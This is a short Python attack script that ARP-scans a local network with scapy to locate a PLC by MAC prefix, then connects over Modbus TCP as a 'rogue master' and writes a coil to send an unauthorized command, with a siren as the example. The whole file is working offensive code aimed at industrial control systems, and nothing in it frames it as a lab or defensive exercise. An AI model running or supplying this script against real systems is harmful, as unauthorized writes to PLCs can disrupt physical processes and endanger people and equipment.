import scapy.all as scapy
from pymodbus.client.sync import ModbusTcpClient
import socket

# Scan for the PLC IP Address in the local network
def discover_plc():
    print("[*] Scanning Network for PLC...")
    plc_ip = None
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Change subnet as needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast / arp_request
    answered_list = scapy.srp(arp_packet, timeout=2, verbose=False)[0]

    for pkt in answered_list:
        ip = pkt[1].psrc
        mac = pkt[1].hwsrc
        print(f"Discovered Device: {ip} [{mac}]")
        # Assuming the PLC has a known MAC vendor (could be refined for specific brands)
        if "00:1A:XX" in mac:  # Example MAC prefix for an ICS vendor
            plc_ip = ip
            print(f"[+] PLC Found at: {plc_ip}")
            break

    return plc_ip

# Connect as a Rogue Master and send unauthorized Modbus commands
def rogue_master_attack(plc_ip):
    if not plc_ip:
        print("[!] No PLC Found!")
        return

    # Establish connection to the PLC
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip, port=502)  # Default Modbus TCP Port

    if client.connect():
        print("[+] Connected as Rogue Master!")
        
        # Example: Writing a coil (e.g., turning ON a siren)
        address = 0x0001  # Change based on PLC memory map
        value = 1  # Set coil to ON state
        response = client.write_coil(address, value)

        if response.isError():
            print("[!] Failed to Write Unauthorized Command.")
        else:
            print("[+] Unauthorized Command Sent Successfully!")
        
        client.close()
    else:
        print("[!] Could not Connect to PLC.")

# Main Execution
if __name__ == "__main__":
    plc_ip = discover_plc()
    if plc_ip:
        rogue_master_attack(plc_ip)